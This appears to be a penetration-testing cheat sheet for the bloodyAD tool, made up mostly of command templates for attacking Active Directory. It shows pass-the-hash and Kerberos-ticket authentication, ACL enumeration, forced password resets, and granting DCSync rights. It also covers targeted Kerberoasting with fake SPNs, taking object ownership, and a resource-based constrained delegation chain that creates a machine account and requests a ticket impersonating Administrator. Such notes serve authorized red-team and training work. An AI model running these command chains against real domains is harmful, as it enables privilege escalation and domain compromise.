+++
title = "bloodyAD"
+++

* https://github.com/CravateRouge/bloodyAD/wiki/User-Guide
* https://seriotonctf.github.io/BloodyAD-Cheatsheet/index.html

Modern Python tool for AD attack chains with various authentications and built for ACL abuse, password resets, and DACL manipulation.

## Setup

```bash
sudo apt install -y bloodyad
```

## Authentication

```bash
# Password
bloodyAD -u <USER> -p '<PASSWORD>' -d <DOMAIN> --dc-ip <DC_IP> <COMMAND>

# NTLM hash (pass-the-hash)
bloodyAD -u <USER> -p :<NT_HASH> -d <DOMAIN> --dc-ip <DC_IP> <COMMAND>

# Kerberos ticket
KRB5CCNAME=<CCACHE_FILE> bloodyAD -u <USER> -k -d <DOMAIN> --dc-ip <DC_IP> <COMMAND>

# Certificate
bloodyAD -u <USER> -c '<CERT_PFX>:<PASSWORD>' -d <DOMAIN> --dc-ip <DC_IP> <COMMAND>
```

## Enumeration

### Users and Groups

```bash
# Get object attributes
bloodyAD -u <USER> -p '<PASSWORD>' -d <DOMAIN> --dc-ip <DC_IP> get object <TARGET_USER>
bloodyAD -u <USER> -p '<PASSWORD>' -d <DOMAIN> --dc-ip <DC_IP> get object <TARGET_USER> --attr servicePrincipalName

# Get DACL on object (ACL enumeration)
bloodyAD -u <USER> -p '<PASSWORD>' -d <DOMAIN> --dc-ip <DC_IP> get writable

# Get children of OU/container
bloodyAD -u <USER> -p '<PASSWORD>' -d <DOMAIN> --dc-ip <DC_IP> get children --base "OU=<OU_NAME>,DC=<DOMAIN_DC>,DC=<TLD>"

# LDAP search
bloodyAD -u <USER> -p '<PASSWORD>' -d <DOMAIN> --dc-ip <DC_IP> get search \
  --base "DC=<DOMAIN_DC>,DC=<TLD>" \
  --filter "(objectClass=user)" \
  --attr "sAMAccountName,memberOf"
```

### Password Policy

```bash
bloodyAD -u <USER> -p '<PASSWORD>' -d <DOMAIN> --dc-ip <DC_IP> get object "DC=<DOMAIN_DC>,DC=<TLD>" --attr minPwdLength,pwdProperties,lockoutThreshold
```

## Modify

### Change Password

Requires `ForceChangePassword` ACL or higher on target.

```bash
bloodyAD -u <USER> -p '<PASSWORD>' -d <DOMAIN> --dc-ip <DC_IP> set password <TARGET_USER> '<NEW_PASSWORD>'
```

### Change Own Password

Must know current password.

```bash
bloodyAD -u <USER> -p '<OLD_PASSWORD>' -d <DOMAIN> --dc-ip <DC_IP> set password <USER> '<NEW_PASSWORD>' --oldpass '<OLD_PASSWORD>'
```

### Add User to Group

Requires `GenericWrite` or `WriteMember` on the target group.

```bash
bloodyAD -u <USER> -p '<PASSWORD>' -d <DOMAIN> --dc-ip <DC_IP> add groupMember <GROUP> <USER_TO_ADD>
```

### Remove User from Group

```bash
bloodyAD -u <USER> -p '<PASSWORD>' -d <DOMAIN> --dc-ip <DC_IP> remove groupMember <GROUP> <USER_TO_REMOVE>
```

### Recover Deleted AD Objects

```bash
# Search for deleted AD objects (-x: simple auth)
ldapsearch -x  -s sub "(isDeleted=TRUE)" -E '!1.2.840.113556.1.4.417' -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASSWORD>' -b "CN=Deleted Objects,DC=<DOMAIN_SUB>,DC=<DOMAIN_TOPLEVEL>"

# Bring object back to life
bloodyAD -d <DOMAIN> -u <USER> -p '<PASSWORD>' --host <DC_FQDN> --dc-ip <DC_IP> set restore 'CN=<OBJECT_CN>\0ADEL:<USER_SID>,CN=Deleted Objects,DC=<DOMAIN_SUB>,DC=<DOMAIN_TOPLEVEL>'
```

## ACL Abuse Paths

### `GenericAll` / `GenericWrite`

#### Enable `DCSync`

```bash
bloodyAD -u <USER> -p '<PASSWORD>' -d <DOMAIN> --dc-ip <DC_IP> add dcsync <TARGET_USER>
```

#### Enable Targeted Kerberoast

With `WriteSPN` permission. Kerberoast after writing the SPN.

```bash
# Check for SPN
bloodyAD -u <USER> -p '<PASSWORD>' -d <DOMAIN> --dc-ip <DC_IP> get object divanov --attr servicePrincipalName

# Set SPN
bloodyAD -u <USER> -p '<PASSWORD>' -d <DOMAIN> --dc-ip <DC_IP> set object <TARGET_USER> servicePrincipalName -v 'fake/<TARGET_USER>'

# Remove SPN
bloodyAD -u <USER> -p '<PASSWORD>' -d <DOMAIN> --dc-ip <DC_IP> set object <TARGET_USER> servicePrincipalName
```

### `WriteOwner`: Take Ownership + Grant Rights

```bash
# Take ownership
bloodyAD -u <USER> -p '<PASSWORD>' -d <DOMAIN> --dc-ip <DC_IP> set owner <TARGET_USER> <USER>

# Grant user GenericAll
bloodyAD -u <USER> -p '<PASSWORD>' -d <DOMAIN> --dc-ip <DC_IP> add genericAll <TARGET_USER> <USER>

# Reset password
```

### `AddSelf`: Add Self to Group

```bash
bloodyAD -u <USER> -p '<PASSWORD>' -d <DOMAIN> --dc-ip <DC_IP> add groupMember <GROUP> <USER>
```

### Resource-Based Constrained Delegation (RBCD)

The standard ACL abuse path with `GenericWrite`/`GenericAll` on a **computer** object AND `MachineAccountQuota > 0` (default 10) OR an existing machine account . Can authenticate to that computer as any user (including Administrator) by writing to controlled machine account to its `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute.

For **user** targets, prefer simpler paths (password reset, Shadow Credentials, Targeted Kerberoast).


```bash
# Check MachineAccountQuota
nxc ldap <DC_IP> -u <USER> -p '<PASSWORD>' -M maq

# Create machine account
impacket-addcomputer <DOMAIN>/<USER>:'<PASSWORD>' -computer-name 'FAKE01$' -computer-pass '<NEW_PASS>' -dc-ip <DC_IP>

# Write RBCD attribute on target
bloodyAD -u <USER> -p '<PASSWORD>' -d <DOMAIN> --dc-ip <DC_IP> add rbcd <TARGET_COMPUTER> 'FAKE01$'

# Request impersonation ticket
impacket-getST -spn 'cifs/<TARGET_COMPUTER_FQDN>' -impersonate Administrator <DOMAIN>/'FAKE01$':'<NEW_PASS>' -dc-ip <DC_IP>
````